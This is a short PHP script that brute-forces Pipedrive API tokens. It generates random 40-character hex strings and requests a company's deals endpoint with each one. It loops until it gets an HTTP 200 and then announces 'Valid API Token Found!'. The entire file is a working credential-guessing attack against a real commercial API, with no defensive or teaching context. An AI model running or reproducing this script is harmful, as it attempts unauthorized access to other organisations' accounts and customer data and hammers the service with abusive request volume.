<?php

function generate_api_token($length) {
    $characters = array("a", "b", "c", "d", "e", "f", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $characters_length = count($characters);

    while (true) {
        $token = "";
        for ($i = 0; $i < $length; $i++) {
            $random_index = mt_rand(0, $characters_length - 1);
            $token .= $characters[$random_index];
        }

        $url = "https://companydomain.pipedrive.com/v1/deals?api_token=" . $token;
        $response = get_http_response_code($url);

        echo "Generated Token: " . $token . "\n";
        echo "API Request URL: " . $url . "\n";
        echo "Response Code: " . $response . "\n";

        if ($response == 200) {
            echo "Valid API Token Found!\n";
            break;
        }
    }
}

function get_http_response_code($url) {
    $headers = get_headers($url);
    return intval(substr($headers[0], 9, 3));
}

generate_api_token(40);

